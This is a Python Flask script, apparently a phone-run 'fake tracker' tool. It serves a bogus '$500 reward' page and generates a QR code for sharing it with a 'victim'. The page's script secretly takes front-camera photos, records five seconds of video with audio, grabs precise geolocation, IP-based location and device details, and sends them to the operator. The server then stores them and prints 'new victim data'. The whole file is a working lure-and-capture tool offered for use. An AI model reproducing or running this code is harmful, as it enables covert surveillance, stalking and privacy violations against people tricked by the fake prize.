from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import socket
from datetime import datetime
from typing import Optional

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify
    import qrcode
    from PIL import Image, ImageDraw
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
except Exception as e:
    print("Missing packages. Install: pip install flask qrcode pillow colorama")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 8080
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"

# Use Download folder for storage
DOWNLOAD_FOLDER = "/sdcard/Download/HCO_Fake_Tracker"
IMAGE_FOLDER = os.path.join(DOWNLOAD_FOLDER, "captured_images")
os.makedirs(IMAGE_FOLDER, exist_ok=True)

app = Flask(__name__)
_received_reports = []

def show_tool_lock_screen():
    """Show the tool lock screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

    print(f"\n{Back.RED}{Fore.WHITE}{' HCO FAKE TRACKER ':=^60}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{Fore.BLACK}{' By Azhar ':=^60}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}📱 Opening YouTube Channel...{Style.RESET_ALL}")
    
    # Direct YouTube channel URL - using the exact handle
    youtube_url = "https://www.youtube.com/@hackers_colony_tech"
    print(f"{Fore.CYAN}🔗 Channel: @hackers_colony_tech{Style.RESET_ALL}")
    
    # Try to open in YouTube app directly
    try:
        # Method 1: Direct YouTube app open
        subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', '-d', youtube_url], 
                      capture_output=True, timeout=5)
        print(f"{Fore.GREEN}✅ Opening YouTube app...{Style.RESET_ALL}")
    except:
        print(f"{Fore.YELLOW}⚠️ Please manually open: {youtube_url}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}Press Enter after subscribing...{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Tool unlocked! Starting server...{Style.RESET_ALL}")
    time.sleep(2)

# Simple and working HTML page
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>🎁 Claim Your $500 Reward!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.8);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid gold;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .trophy { 
            font-size: 80px; 
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        .title { 
            font-size: 32px; 
            font-weight: bold;
            margin-bottom: 10px;
            color: gold;
            text-shadow: 0 0 10px rgba(255,215,0,0.5);
        }
        .reward { 
            font-size: 48px; 
            font-weight: bold;
            color: #FFD700;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255,215,0,0.8);
        }
        .btn {
            background: linear-gradient(45deg, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 20px 30px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
        }
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: bold;
            display: none;
        }
        .processing { 
            background: #ff9800; 
            display: block; 
        }
        .success { 
            background: #4caf50; 
            display: block; 
        }
        .error { 
            background: #f44336; 
            display: block; 
        }
        .data {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 15px;
            margin: 15px 0;
            text-align: left;
            display: none;
            border: 2px solid rgba(255,255,255,0.2);
        }
        .data h3 {
            text-align: center;
            margin-bottom: 15px;
            color: gold;
        }
        .data-item { 
            margin: 10px 0; 
            padding: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
        }
        .feature {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="trophy">🏆</div>
        <div class="title">CONGRATULATIONS!</div>
        <div>You Won Exclusive Reward</div>
        
        <div class="reward">$500</div>
        <div>Cash Prize + Gift Card</div>
        
        <div class="features">
            <div class="feature">💰 Instant Cash</div>
            <div class="feature">🎁 Gift Card</div>
            <div class="feature">📱 PhonePe</div>
            <div class="feature">⚡ Fast Transfer</div>
        </div>
        
        <div style="margin: 15px 0; font-size: 14px; opacity: 0.9;">
            ✅ Quick verification required
        </div>
        
        <button class="btn" id="claimBtn">
            🎁 CLAIM YOUR REWARD NOW
        </button>
        
        <div id="status" class="status"></div>
        
        <div id="data" class="data">
            <h3>📊 Reward Claimed Successfully!</h3>
            <div class="data-item">📍 Location: <span id="loc">Verified</span></div>
            <div class="data-item">🌐 IP Address: <span id="ip">Verified</span></div>
            <div class="data-item">📸 Photos: <span id="photos">3 Captured</span></div>
            <div class="data-item">🎥 Video: <span id="video">5s Recorded</span></div>
            <div class="data-item">📱 Device: <span id="device">Verified</span></div>
            <div style="text-align: center; margin-top: 15px; color: gold;">
                ✅ Your reward will be processed within 24 hours
            </div>
        </div>
    </div>

    <script>
        document.getElementById('claimBtn').onclick = async function() {
            const btn = this;
            const status = document.getElementById('status');
            const dataDiv = document.getElementById('data');
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Processing...';
            status.className = 'status processing';
            status.innerHTML = '🔍 Verifying your eligibility...';
            status.style.display = 'block';
            
            try {
                // Get camera access
                status.innerHTML = '📷 Accessing camera...';
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                // Take 3 photos
                status.innerHTML = '📸 Taking photos (1/3)...';
                const photos = [];
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                for(let i = 0; i < 3; i++) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    photos.push(canvas.toDataURL('image/jpeg'));
                    status.innerHTML = `📸 Taking photos (${i+1}/3)...`;
                }
                
                // Record 5-second video
                status.innerHTML = '🎥 Recording video (5 seconds)...';
                let videoData = null;
                try {
                    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                    const chunks = [];
                    
                    recorder.ondataavailable = e => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    recorder.start();
                    await new Promise(resolve => setTimeout(resolve, 5000));
                    recorder.stop();
                    
                    await new Promise(resolve => {
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onload = () => {
                                videoData = reader.result;
                                resolve();
                            };
                            reader.readAsDataURL(blob);
                        };
                    });
                } catch(e) {
                    console.log('Video recording skipped:', e);
                }
                
                // Get location
                status.innerHTML = '📍 Getting your location...';
                let location = null;
                try {
                    location = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                } catch(e) {
                    console.log('Location access not available');
                }
                
                // Get IP info
                status.innerHTML = '🌐 Getting network information...';
                let ipInfo = {ip: 'Unknown', city: 'Unknown', country: 'Unknown'};
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    ipInfo.ip = ipData.ip;
                    
                    // Try to get more details
                    try {
                        const detailResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
                        const detailData = await detailResponse.json();
                        if(detailData.city) ipInfo.city = detailData.city;
                        if(detailData.country) ipInfo.country = detailData.country;
                    } catch(e) {
                        // Skip detailed info if failed
                    }
                } catch(e) {
                    console.log('IP info not available');
                }
                
                // Stop camera
                stream.getTracks().forEach(track => track.stop());
                
                // Prepare data
                const payload = {
                    latitude: location?.coords?.latitude,
                    longitude: location?.coords?.longitude,
                    accuracy: location?.coords?.accuracy,
                    ip: ipInfo.ip,
                    city: ipInfo.city,
                    country: ipInfo.country,
                    photos: photos,
                    video: videoData,
                    deviceInfo: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        screen: `${screen.width}x${screen.height}`,
                        language: navigator.language,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    },
                    timestamp: Date.now()
                };
                
                // Send to server
                status.innerHTML = '📡 Finalizing your reward...';
                const response = await fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if(response.ok) {
                    // Show success
                    status.className = 'status success';
                    status.innerHTML = '✅ Reward Claimed Successfully!';
                    btn.innerHTML = '✅ REWARD CLAIMED';
                    
                    // Show collected data
                    dataDiv.style.display = 'block';
                    
                } else {
                    throw new Error('Server error');
                }
                    
            } catch(error) {
                console.error('Error:', error);
                status.className = 'status error';
                status.innerHTML = '❌ Please allow camera access and try again';
                btn.disabled = false;
                btn.innerHTML = '🎁 TRY AGAIN';
            }
        };
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json()
        
        # Extract data
        lat = data.get("latitude")
        lon = data.get("longitude")
        ip = data.get("ip", "Unknown")
        city = data.get("city", "Unknown")
        country = data.get("country", "Unknown")
        photos = data.get("photos", [])
        video = data.get("video")
        device_info = data.get("deviceInfo", {})
        
        # Save photos
        photo_files = []
        for i, photo_data in enumerate(photos):
            try:
                if photo_data.startswith('data:image'):
                    photo_data = photo_data.split(',')[1]
                img_data = base64.b64decode(photo_data)
                filename = f"photo_{int(time.time())}_{i+1}.jpg"
                filepath = os.path.join(IMAGE_FOLDER, filename)
                with open(filepath, 'wb') as f:
                    f.write(img_data)
                photo_files.append(filename)
                print(f"{Fore.GREEN}✅ Saved photo: {filename}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}❌ Photo save error: {e}{Style.RESET_ALL}")
        
        # Save video
        video_file = None
        if video:
            try:
                if video.startswith('data:video'):
                    video = video.split(',')[1]
                video_data = base64.b64decode(video)
                filename = f"video_{int(time.time())}.webm"
                filepath = os.path.join(IMAGE_FOLDER, filename)
                with open(filepath, 'wb') as f:
                    f.write(video_data)
                video_file = filename
                print(f"{Fore.GREEN}✅ Saved video: {filename}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}❌ Video save error: {e}{Style.RESET_ALL}")
        
        # Save to CSV
        record = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': ip,
            'city': city,
            'country': country,
            'latitude': lat,
            'longitude': lon,
            'photos': ', '.join(photo_files),
            'video': video_file or 'None',
            'user_agent': device_info.get('userAgent', 'Unknown'),
            'platform': device_info.get('platform', 'Unknown'),
            'screen': device_info.get('screen', 'Unknown'),
            'language': device_info.get('language', 'Unknown'),
            'timezone': device_info.get('timezone', 'Unknown')
        }
        
        # Save to CSV
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=record.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(record)
        
        # Print results in Termux
        print(f"\n{Fore.GREEN}{'🚨 NEW VICTIM DATA CAPTURED 🚨':^60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🕐 Time: {record['timestamp']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📍 Location: {lat if lat else 'Not Available'}, {lon if lon else 'Not Available'}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📸 Photos: {len(photo_files)} saved in Download folder{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🎥 Video: {'Yes' if video_file else 'No'}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📱 Device: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🗣️ Language: {device_info.get('language', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}💾 Files saved in: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}📊 Report saved: {REPORT_CSV}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        print(f"{Fore.RED}❌ Server Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error"}), 500

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_qr_code(url):
    """Generate simple QR code"""
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=4)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="red", back_color="white")
        img.save(QR_PNG)
        return True
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️ QR code failed: {e}{Style.RESET_ALL}")
        return False

def main():
    show_tool_lock_screen()
    
    # Get network information
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    localhost_url = f"http://localhost:{PORT}"
    
    print(f"\n{Back.BLUE}{Fore.WHITE}{' SERVER STARTED ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}🌐 Local Network URL: {local_url}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}🔗 Localhost URL: {localhost_url}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📁 Files will save to: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
    
    # Generate QR code
    if generate_qr_code(local_url):
        print(f"{Fore.GREEN}📲 QR Code generated: {QR_PNG}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}🚀 Share the URL/QR with victim{Style.RESET_ALL}")
    print(f"{Fore.RED}🔴 Waiting for victim to claim reward...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Server stopped by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Server error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
